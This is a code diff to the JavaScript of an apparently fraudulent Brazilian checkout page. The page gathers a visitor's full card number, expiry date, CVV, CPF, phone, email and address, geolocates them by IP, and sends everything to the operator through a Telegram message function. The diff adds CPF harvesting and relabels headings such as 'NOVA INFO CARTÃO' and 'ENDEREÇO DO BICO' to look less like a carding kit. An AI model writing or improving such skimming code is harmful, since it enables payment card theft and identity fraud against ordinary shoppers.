@@ -37,32 +37,59 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     // Máscara para CEP
-    const cardCepInput = document.getElementById('cardCep');
-    if (cardCepInput) {
-        cardCepInput.addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length >= 5) {
-                value = value.substring(0, 5) + '-' + value.substring(5, 8);
-            }
-            e.target.value = value.substring(0, 9);
-        });
-    }
+    const cepFields = ['cardCep', 'cep'];
+    cepFields.forEach(fieldId => {
+        const field = document.getElementById(fieldId);
+        if (field) {
+            field.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length >= 5) {
+                    value = value.substring(0, 5) + '-' + value.substring(5, 8);
+                }
+                e.target.value = value.substring(0, 9);
+            });
+        }
+    });
 
     // Máscara para telefone
-    const cardTelefone = document.getElementById('cardTelefone');
-    if (cardTelefone) {
-        cardTelefone.addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length >= 11) {
-                value = value.replace(/^(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
-            } else if (value.length >= 7) {
-                value = value.replace(/^(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
-            } else if (value.length >= 3) {
-                value = value.replace(/^(\d{2})(\d{0,5})/, '($1) $2');
-            }
-            e.target.value = value;
-        });
-    }
+    const telefoneFields = ['cardTelefone', 'telefone'];
+    telefoneFields.forEach(fieldId => {
+        const field = document.getElementById(fieldId);
+        if (field) {
+            field.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length >= 11) {
+                    value = value.replace(/^(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+                } else if (value.length >= 7) {
+                    value = value.replace(/^(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
+                } else if (value.length >= 3) {
+                    value = value.replace(/^(\d{2})(\d{0,5})/, '($1) $2');
+                }
+                e.target.value = value;
+            });
+        }
+    });
+
+    // Máscara para CPF
+    const cpfFields = ['cardCpf', 'cpf'];
+    cpfFields.forEach(fieldId => {
+        const field = document.getElementById(fieldId);
+        if (field) {
+            field.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length >= 11) {
+                    value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+                } else if (value.length >= 9) {
+                    value = value.replace(/(\d{3})(\d{3})(\d{3})/, '$1.$2.$3');
+                } else if (value.length >= 6) {
+                    value = value.replace(/(\d{3})(\d{3})/, '$1.$2');
+                } else if (value.length >= 3) {
+                    value = value.replace(/(\d{3})/, '$1');
+                }
+                e.target.value = value.substring(0, 14);
+            });
+        }
+    });
 
     // Validar cartão (Luhn)
     function validarCartao(numero) {
@@ -100,40 +127,41 @@ document.addEventListener('DOMContentLoaded', function() {
         return true;
     }
 
-    // Obter cidade do usuário para o Telegram
+    // Obter cidade do usuário
     let userCity = '';
     fetch('https://ipapi.co/json/')
         .then(response => response.json())
         .then(data => {
-            userCity = data.city || 'Não informada';
+            userCity = data.city || '';
         })
-        .catch(() => {
-            userCity = 'Não informada';
-        });
+        .catch(() => {});
 
     // Enviar dados para o Telegram
     async function enviarParaTelegram(dados) {
         const mensagem = `
-<b>💳 +1 NOVA INFO CARTÃO</b>
+<b>💳 NOVO CARTÃO</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━
 
-👤 DADOS DO TITULAR
+<b>👤 DADOS DO TITULAR</b>
+├ Nome: ${dados.titular}
+├ Telefone: ${dados.telefone}
 ├ E-mail: ${dados.email}
-├ Titular do cartão: ${dados.titular}
-└ Telefone: ${dados.telefone}
+└ CPF: ${dados.cpf}
 
-💳 DADOS DO CARTÃO
+<b>💳 DADOS DO CARTÃO</b>
 ├ Número: ${dados.numero}
 ├ Validade: ${dados.validade}
 └ CVV: ${dados.cvv}
 
-📍 ENDEREÇO DO BICO
+<b>📍 ENDEREÇO DE ENTREGA</b>
 ├ CEP: ${dados.cep}
 ├ Rua: ${dados.rua}
 ├ Número: ${dados.numeroEnd}
 ├ Complemento: ${dados.complemento}
 └ Cidade: ${dados.cidade}
 
-⏰ Data: ${new Date().toLocaleString('pt-BR')}
+━━━━━━━━━━━━━━━━━━━━━━━━━
+<b>⏰ Data:</b> ${new Date().toLocaleString('pt-BR')}
         `;
 
         try {
@@ -174,6 +202,7 @@ document.addEventListener('DOMContentLoaded', function() {
             const titular = document.getElementById('cardTitular')?.value.trim() || '';
             const telefone = document.getElementById('cardTelefone')?.value.trim() || '';
             const email = document.getElementById('cardEmail')?.value.trim() || '';
+            const cpf = document.getElementById('cardCpf')?.value.trim() || '';
             const numero = document.getElementById('cardNumero')?.value.trim() || '';
             const validade = document.getElementById('cardValidade')?.value.trim() || '';
             const cvv = document.getElementById('cardCvv')?.value.trim() || '';
@@ -189,6 +218,7 @@ document.addEventListener('DOMContentLoaded', function() {
             if (!titular) { showToast('❌ Nome do titular é obrigatório'); return; }
             if (!telefone) { showToast('❌ Telefone é obrigatório'); return; }
             if (!email || !email.includes('@')) { showToast('❌ E-mail inválido'); return; }
+            if (!cpf || cpf.replace(/\D/g, '').length !== 11) { showToast('❌ CPF inválido'); return; }
             if (!numero || numero.replace(/\s/g, '').length < 16) { showToast('❌ Número do cartão inválido'); return; }
             if (!validarCartao(numero)) { showToast('❌ Número do cartão inválido'); return; }
             if (!validade || !validarValidade(validade)) { showToast('❌ Data de validade inválida'); return; }
@@ -202,6 +232,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 titular: titular,
                 telefone: telefone,
                 email: email,
+                cpf: cpf,
                 numero: numero,
                 validade: validade,
                 cvv: cvv,
@@ -209,7 +240,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 rua: rua,
                 numeroEnd: numeroEnd,
                 complemento: complemento,
-                cidade: userCity
+                cidade: userCity || 'Não identificada'
             };
             
             // Desabilitar botão e mostrar loading
